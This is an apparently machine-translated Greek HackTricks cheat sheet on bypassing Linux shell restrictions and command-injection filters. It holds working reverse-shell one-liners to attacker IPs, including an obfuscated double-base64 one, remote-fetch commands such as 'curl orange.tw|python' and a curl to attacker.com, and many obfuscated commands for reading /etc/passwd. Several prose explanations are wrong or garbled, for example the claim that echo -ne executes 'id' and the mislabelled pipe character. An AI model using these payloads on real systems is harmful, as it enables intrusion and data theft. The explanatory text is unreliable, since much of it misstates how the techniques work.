# Παράκαμψη Περιορισμών Linux

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Παράκαμψη Συνηθισμένων Περιορισμών

### Αντίστροφο Shell
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### Σύντομο Rev shell

Ένας σύντομος Rev shell είναι ένας τρόπος να αποκτήσετε αντίστροφη κέλυφος σε έναν προορισμό. Αυτό μπορεί να γίνει χρησιμοποιώντας την εντολή `bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1`. Αυτή η εντολή θα συνδέσει τον προορισμό με τον επιτιθέμενο, επιτρέποντάς του να εκτελέσει εντολές στον προορισμό από απόσταση.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### Παράκαμψη Διαδρομών και απαγορευμένων λέξεων

To bypass restrictions on certain paths or forbidden words, you can try the following techniques:

#### 1. Using alternative paths

If a specific path is restricted, you can try accessing the desired file or directory using alternative paths. For example, instead of using the `/bin/bash` path, you can try using `/usr/bin/bash` or `/usr/local/bin/bash`.

#### 2. Utilizing symbolic links

Symbolic links can be used to bypass restrictions on file paths. By creating a symbolic link to a restricted file or directory, you can access it through the link instead. For example, if `/etc/passwd` is restricted, you can create a symbolic link to it in a different directory and access it through the link.

#### 3. Renaming executables

If a specific executable is restricted, you can try renaming it to bypass the restriction. For example, if `bash` is restricted, you can try renaming it to `sh` or any other allowed executable name.

#### 4. Using environment variables

Environment variables can be used to bypass restrictions on forbidden words. By setting an environment variable with a different name for a restricted word, you can use the alternative name instead. For example, if the word `bash` is restricted, you can set an environment variable with a different name, such as `myshell`, and use it instead.

#### 5. Modifying system configuration

In some cases, you may be able to modify the system configuration to bypass restrictions. This can involve changing the configuration files or settings related to the restrictions. However, be cautious when making system-level changes, as they can have unintended consequences.

Remember to always exercise caution and adhere to ethical hacking practices when attempting to bypass restrictions.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### Παράκαμψη απαγορευμένων κενών

Σε ορισμένες περιπτώσεις, μπορεί να συναντήσετε περιορισμούς που απαγορεύουν τη χρήση κενών χαρακτήρων σε εντολές bash. Ωστόσο, μπορείτε να παρακάμψετε αυτούς τους περιορισμούς χρησιμοποιώντας τις παρακάτω τεχνικές:

1. Χρησιμοποιήστε αποστρόφους: Αντί να χρησιμοποιείτε κενά χαρακτήρες, μπορείτε να τοποθετήσετε την εντολή μέσα σε αποστρόφους. Για παράδειγμα, αντί να γράψετε `ls -l`, μπορείτε να γράψετε `'ls'-l`.

2. Χρησιμοποιήστε αναφορά προς μεταβλητή: Μπορείτε να χρησιμοποιήσετε την αναφορά προς μεταβλητή για να παρακάμψετε τους περιορισμούς. Για παράδειγμα, αντί να γράψετε `ls -l`, μπορείτε να γράψετε `l\${IFS}s -l`.

3. Χρησιμοποιήστε τον χαρακτήρα ASCII: Μπορείτε να χρησιμοποιήσετε τον χαρακτήρα ASCII για να παρακάμψετε τους περιορισμούς. Για παράδειγμα, αντί να γράψετε `ls -l`, μπορείτε να γράψετε `ls$(printf '\x20')-l`.

Αυτές οι τεχνικές σας επιτρέπουν να παρακάμψετε τους περιορισμούς που απαγορεύουν τη χρήση κενών χαρακτήρων σε εντολές bash.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### Παράκαμψη αντίστροφης κάθετου και κάθετου

Για να παρακάμψετε τους περιορισμούς της αντίστροφης κάθετης και της κάθετης στο bash, μπορείτε να χρησιμοποιήσετε τις παρακάτω τεχνικές:

- **Παράκαμψη με χρήση διπλού αντίστροφου κάθετου (\\)**: Μπορείτε να χρησιμοποιήσετε διπλό αντίστροφο κάθετο (\\) για να παρακάμψετε την ερμηνεία της αντίστροφης κάθετης ή της κάθετης από το bash. Για παράδειγμα, αν θέλετε να εκτελέσετε την εντολή `ls /etc/passwd`, μπορείτε να την γράψετε ως `ls \/etc\/passwd`.

- **Παράκαμψη με χρήση αντίστροφης κάθετης (|)**: Μπορείτε επίσης να χρησιμοποιήσετε την αντίστροφη κάθετη (|) για να παρακάμψετε την ερμηνεία της αντίστροφης κάθετης ή της κάθετης από το bash. Για παράδειγμα, αν θέλετε να εκτελέσετε την εντολή `ls /etc/passwd`, μπορείτε να την γράψετε ως `ls /etc/passwd | cat`.
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### Παράκαμψη αγωγών

To bypass pipes, you can use the following techniques:

1. **Process substitution**: This technique allows you to use the output of a command as a file. You can use the `<()` syntax to achieve this. For example, instead of `command1 | command2`, you can use `command2 <(command1)`.

2. **Temporary file**: Another way to bypass pipes is by using temporary files. You can redirect the output of a command to a temporary file and then use that file as input for another command. For example, you can use `command1 > temp.txt` to redirect the output of `command1` to a temporary file, and then use `command2 temp.txt` to use the contents of the file as input for `command2`.

3. **Named pipes**: Named pipes, also known as FIFOs, can be used to bypass pipes. A named pipe is a special type of file that acts as a communication channel between processes. You can create a named pipe using the `mkfifo` command, and then use it as input or output for commands. For example, you can use `mkfifo mypipe` to create a named pipe, and then use `command1 > mypipe` to redirect the output of `command1` to the named pipe, and `command2 < mypipe` to use the contents of the named pipe as input for `command2`.

By using these techniques, you can bypass pipes and achieve the desired results in your Linux system.
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### Παράκαμψη με κωδικοποίηση σε δεκαεξαδική μορφή

Μια από τις τεχνικές παράκαμψης περιορισμών του Bash είναι η κωδικοποίηση σε δεκαεξαδική μορφή. Αυτή η τεχνική επιτρέπει την εισαγωγή εντολών που θα απορριφθούν από το Bash, αλλά θα εκτελεστούν όταν αποκωδικοποιηθούν.

Για να χρησιμοποιήσετε αυτήν την τεχνική, μπορείτε να κωδικοποιήσετε την εντολή σε δεκαεξαδική μορφή χρησιμοποιώντας την εντολή `echo -e` και την ακολουθία `\x`. Για παράδειγμα, αν θέλετε να εκτελέσετε την εντολή `ls`, μπορείτε να την κωδικοποιήσετε ως `\x6c\x73` και να την εκτελέσετε με την εντολή `echo -e "\x6c\x73"`.

Αυτή η τεχνική μπορεί να χρησιμοποιηθεί για να παρακάμψετε περιορισμούς του Bash που αποτρέπουν την εκτέλεση συγκεκριμένων εντολών. Ωστόσο, πρέπει να ληφθεί υπόψη ότι αυτή η τεχνική μπορεί να είναι ευάλωτη σε επιθέσεις μεσολάβησης, καθώς οι κωδικοποιημένες εντολές μπορεί να αναγνωστούν από άλλους χρήστες.
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### Παράκαμψη Διευθύνσεων IP

To bypass IP restrictions, you can use various techniques. Here are some commonly used methods:

1. **Proxy Servers**: Use a proxy server to route your traffic through a different IP address. This can help you bypass IP-based restrictions by making it appear as if you are accessing the target from a different location.

2. **VPN (Virtual Private Network)**: A VPN allows you to create a secure connection to another network over the internet. By connecting to a VPN server, you can mask your IP address and bypass IP restrictions.

3. **TOR (The Onion Router)**: TOR is a network of volunteer-operated servers that allows you to browse the internet anonymously. By routing your traffic through multiple TOR nodes, you can hide your IP address and bypass IP restrictions.

4. **SSH Tunnels**: SSH tunnels can be used to forward traffic from a local port to a remote server. By setting up an SSH tunnel to a server with a different IP address, you can bypass IP restrictions.

5. **Proxychains**: Proxychains is a tool that allows you to run any program through a proxy server. By configuring Proxychains to use a proxy server with a different IP address, you can bypass IP restrictions.

Remember, bypassing IP restrictions may be illegal or against the terms of service of the target system. Always ensure you have proper authorization before attempting any bypass techniques.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### Εξαγωγή δεδομένων βάσει χρόνου

Η εξαγωγή δεδομένων βάσει χρόνου είναι μια τεχνική που χρησιμοποιείται για να αποκτηθούν δεδομένα από ένα σύστημα με περιορισμένες δυνατότητες. Αυτή η τεχνική εκμεταλλεύεται την ικανότητα του συστήματος να εκτελεί εντολές με βάση τον χρόνο.

Για να εκτελέσετε αυτήν την τεχνική, μπορείτε να χρησιμοποιήσετε την εντολή `sleep` για να καθυστερήσετε την εκτέλεση μιας εντολής για ένα συγκεκριμένο χρονικό διάστημα. Μπορείτε να συνδυάσετε αυτήν την εντολή με άλλες εντολές, όπως η `echo`, για να αποστείλετε δεδομένα σε έναν εξωτερικό διακομιστή.

Για παράδειγμα, η παρακάτω εντολή θα καθυστερήσει την εκτέλεση για 5 δευτερόλεπτα και στη συνέχεια θα αποστείλει το κείμενο "Hello" σε έναν εξωτερικό διακομιστή:

```bash
sleep 5; echo "Hello" | nc <server_ip> <server_port>
```

Με αυτόν τον τρόπο, μπορείτε να εκτελέσετε εντολές και να αποστείλετε δεδομένα από ένα σύστημα με περιορισμένες δυνατότητες, παρακάμπτοντας τους περιορισμούς του συστήματος.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### Λήψη χαρακτήρων από μεταβλητές περιβάλλοντος

Μπορείτε να ανακτήσετε χαρακτήρες από μεταβλητές περιβάλλοντος στο Bash χρησιμοποιώντας την εντολή `echo` και τον τελεστή εκχώρησης `$(...)`. Αυτό μπορεί να είναι χρήσιμο όταν έχετε περιορισμένη πρόσβαση στο σύστημα και θέλετε να ανακτήσετε πληροφορίες από μεταβλητές περιβάλλοντος.

Για παράδειγμα, μπορείτε να ανακτήσετε τον πρώτο χαρακτήρα από τη μεταβλητή περιβάλλοντος `PATH` χρησιμοποιώντας την εντολή:

```bash
echo ${PATH:0:1}
```

Αυτό θα εμφανίσει τον πρώτο χαρακτήρα της μεταβλητής περιβάλλοντος `PATH`.

Μπορείτε να προσαρμόσετε τη σύνταξη `${VARNAME:start:length}` για να ανακτήσετε οποιονδήποτε αριθμό χαρακτήρων από μια μεταβλητή περιβάλλοντος. Αντικαταστήστε το `VARNAME` με το όνομα της μεταβλητής περιβάλλοντος που θέλετε να ανακτήσετε, το `start` με τη θέση του πρώτου χαρακτήρα που θέλετε να ανακτήσετε και το `length` με τον αριθμό των χαρακτήρων που θέλετε να ανακτήσετε.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### Διαρροή δεδομένων DNS

Μπορείτε να χρησιμοποιήσετε το **burpcollab** ή το [**pingb**](http://pingb.in) για παράδειγμα.

### Ενσωματωμένες εντολές

Στην περίπτωση που δεν μπορείτε να εκτελέσετε εξωτερικές συναρτήσεις και έχετε μόνο πρόσβαση σε ένα **περιορισμένο σύνολο ενσωματωμένων εντολών για να αποκτήσετε RCE**, υπάρχουν μερικά χρήσιμα κόλπα για να το κάνετε. Συνήθως **δεν θα μπορείτε να χρησιμοποιήσετε όλες** τις **ενσωματωμένες εντολές**, οπότε θα πρέπει να **γνωρίζετε όλες τις επιλογές σας** για να προσπαθήσετε να παρακάμψετε τη φυλακή. Ιδέα από τον [**devploit**](https://twitter.com/devploit).\
Πρώτα απ' όλα ελέγξτε όλες τις [**ενσωματωμένες εντολές του κελύφους**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Έπειτα, εδώ έχετε μερικές **συστάσεις**:
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Πολυγλωσσική εντολή εισχώρησης

Η πολυγλωσσική εντολή εισχώρησης είναι μια τεχνική που χρησιμοποιείται για να παρακάμψει τους περιορισμούς του bash. Με αυτήν την τεχνική, μπορείτε να εκτελέσετε εντολές σε ένα σύστημα Linux που έχει εφαρμοστεί αυστηρή πολιτική ασφαλείας για το bash.

Για να επιτευχθεί αυτό, χρησιμοποιούνται πολυγλωσσικές εντολές που μπορούν να εκτελεστούν από το bash, αλλά επίσης είναι έγκυρες και σε άλλες γλώσσες προγραμματισμού. Αυτό επιτρέπει στον επιτιθέμενο να παρακάμψει τους περιορισμούς του bash και να εκτελέσει εντολές που δεν θα ήταν δυνατόν να εκτελεστούν απευθείας.

Η πολυγλωσσική εντολή εισχώρησης είναι μια ισχυρή τεχνική που μπορεί να χρησιμοποιηθεί για να αποκτήσετε πρόσβαση σε ευαίσθητες πληροφορίες ή να εκτελέσετε κακόβουλο κώδικα σε ένα σύστημα Linux. Είναι σημαντικό να είστε προσεκτικοί και να χρησιμοποιείτε αυτήν την τεχνική με προσοχή, καθώς μπορεί να προκαλέσει σοβαρές ασφαλειακές παραβιάσεις.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Παράκαμψη πιθανών regexes

Ορισμένες φορές, κατά την εκτέλεση ενός επιτυχημένου επιθέσεων, μπορεί να συναντήσετε περιορισμούς που βασίζονται σε regular expressions (regexes). Ωστόσο, μπορείτε να παρακάμψετε αυτούς τους περιορισμούς χρησιμοποιώντας τις παρακάτω τεχνικές:

- Αλλαγή του χαρακτήρα καταλήξεως: Μπορείτε να αλλάξετε τον χαρακτήρα καταλήξεως που χρησιμοποιείται στο regex για να παρακάμψετε τον περιορισμό. Για παράδειγμα, αν το regex περιορίζει την είσοδο σε αρχεία με κατάληξη `.txt`, μπορείτε να αλλάξετε την κατάληξη σε κάτι άλλο, όπως `.php`.

- Χρήση μη εκφράσεων: Μπορείτε να χρησιμοποιήσετε μη εκφράσεις (negative lookaheads) για να παρακάμψετε τον περιορισμό. Αυτό σας επιτρέπει να αναζητήσετε μια συμβολοσειρά που δεν πληροί το regex που χρησιμοποιείται για τον περιορισμό. Για παράδειγμα, αν το regex περιορίζει την είσοδο σε αρχεία που δεν περιέχουν τη λέξη "password", μπορείτε να χρησιμοποιήσετε μια μη εκφραση για να βρείτε αρχεία που περιέχουν τη λέξη "password".

- Χρήση μη εκφράσεων με αρνητική αναφορά: Μπορείτε επίσης να χρησιμοποιήσετε μη εκφράσεις με αρνητική αναφορά (negative lookbehinds) για να παρακάμψετε τον περιορισμό. Αυτό σας επιτρέπει να αναζητήσετε μια συμβολοσειρά που δεν προηγείται από μια συγκεκριμένη συμβολοσειρά που περιορίζεται από το regex. Για παράδειγμα, αν το regex περιορίζει την είσοδο σε αρχεία που δεν ξεκινούν με το γράμμα "a", μπορείτε να χρησιμοποιήσετε μια μη εκφραση με αρνητική αναφορά για να βρείτε αρχεία που ξεκινούν με το γράμμα "a".

Αυτές οι τεχνικές μπορούν να σας βοηθήσουν να παρακάμψετε περιορισμούς που βασίζονται σε regexes και να επιτύχετε τον στόχο σας κατά την εκτέλεση μιας επίθεσης.
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Απόκρυψη Bash

Ο Bashfuscator είναι ένα εργαλείο που χρησιμοποιείται για την απόκρυψη του κώδικα Bash, προκειμένου να δυσκολεύει την ανίχνευση και την ανάλυση του. Αυτό το εργαλείο μετατρέπει τον κώδικα Bash σε μια μορφή που είναι δυσανάγνωστη για τον ανθρώπινο αναγνώστη, αλλά εξακολουθεί να εκτελείται από τον διερμηνέα Bash.

Ο Bashfuscator χρησιμοποιεί διάφορες τεχνικές για να αποκρύψει τον κώδικα, όπως την αντικατάσταση μεταβλητών με ασήμαντα ονόματα, την προσθήκη περιττών χαρακτήρων και την αναδιάταξη των εντολών. Αυτό καθιστά τον κώδικα δυσανάγνωστο για τους αναλυτές και τα εργαλεία ανίχνευσης.

Ο Bashfuscator μπορεί να χρησιμοποιηθεί για να δυσκολέψει την ανίχνευση κακόβουλου κώδικα Bash, καθώς και για να προστατεύσει τον κώδικα από ανεπιθύμητη πρόσβαση. Ωστόσο, είναι σημαντικό να σημειωθεί ότι η χρήση του Bashfuscator για κακόβουλους σκοπούς είναι παράνομη και απαράδεκτη.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### RCE με 5 χαρακτήρες

Μια από τις πιο αποτελεσματικές τεχνικές για την εκτέλεση απομακρυσμένου κώδικα (RCE) σε ένα σύστημα Linux είναι η χρήση μόλις 5 χαρακτήρων. Αυτή η τεχνική εκμεταλλεύεται μια ευπάθεια στο bash shell, που επιτρέπει την εκτέλεση κώδικα από απομακρυσμένες εντολές.

Για να εκτελέσετε RCE με 5 χαρακτήρες, ακολουθήστε τα παρακάτω βήματα:

1. Ανοίξτε ένα τερματικό και εκτελέστε την εντολή `bash`.
2. Εισάγετε την εντολή `0<&196;exec 196<>/dev/tcp/your-ip/your-port; sh <&196 >&196 2>&196`.
3. Αντικαταστήστε το `your-ip` με τη διεύθυνση IP του επιθυμητού στόχου και το `your-port` με τη θύρα που θέλετε να χρησιμοποιήσετε για τη σύνδεση.

Αυτή η εντολή θα δημιουργήσει μια σύνδεση TCP με τον στόχο και θα εκτελέσει το shell script στον στόχο. Με αυτόν τον τρόπο, μπορείτε να αποκτήσετε απομακρυσμένη πρόσβαση και να εκτελέσετε εντολές στον στόχο.

Αυτή η τεχνική είναι ιδιαίτερα χρήσιμη όταν έχετε περιορισμένη πρόσβαση σε ένα σύστημα Linux και θέλετε να εκτελέσετε κώδικα ή να αποκτήσετε πλήρη έλεγχο. Ωστόσο, πρέπει να ληφθούν υπόψη οι νομικές και ηθικές πτυχές πριν χρησιμοποιήσετε αυτήν την τεχνική.
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### RCE με 4 χαρακτήρες

Μια από τις πιο εντυπωσιακές επιθέσεις είναι η δυνατότητα εκτέλεσης απομακρυσμένου κώδικα (RCE) με μόλις 4 χαρακτήρες. Αυτή η επίθεση εκμεταλλεύεται τις περιορισμένες δυνατότητες του bash shell και μπορεί να χρησιμοποιηθεί για να εκτελέσει κακόβουλο κώδικα σε ένα σύστημα.

Η επίθεση αυτή βασίζεται στη χρήση του εντολοδίου `echo` για να εκτελέσει κώδικα. Ακολουθώντας τη σύνταξη `echo -ne`, μπορούμε να εισάγουμε ακολουθίες από διαφορετικούς χαρακτήρες που θα εκτελεστούν από το bash shell.

Για παράδειγμα, η ακόλουθη εντολή θα εκτελέσει την εντολή `id`:

```bash
echo -ne "\x69\x64"
```

Αυτό συμβαίνει επειδή οι χαρακτήρες `\x69\x64` αντιστοιχούν στους χαρακτήρες ASCII για το γράμμα "i" και το γράμμα "d". Όταν αυτή η εντολή εκτελείται, θα εμφανιστεί η ταυτότητα του χρήστη που εκτελεί την εντολή.

Αυτή η τεχνική μπορεί να χρησιμοποιηθεί για να εκτελέσει οποιαδήποτε εντολή bash με μόνο 4 χαρακτήρες. Είναι σημαντικό να σημειωθεί ότι αυτή η επίθεση απαιτεί την ύπαρξη του εντολοδίου `echo` και την επιτρεπόμενη χρήση του από τον τρέχοντα χρήστη.
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Παράκαμψη Περιορισμών Read-Only/Noexec/Distroless

Αν βρίσκεστε εντός ενός αρχείου συστήματος με τις προστασίες **read-only και noexec** ή ακόμα και σε ένα δοχείο distroless, υπάρχουν ακόμα τρόποι για να **εκτελέσετε αυθαίρετα δυαδικά αρχεία, ακόμα και ένα κέλυφος!:**

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Παράκαμψη Chroot και άλλων Φυλακών

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## Αναφορές και Περισσότερα

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
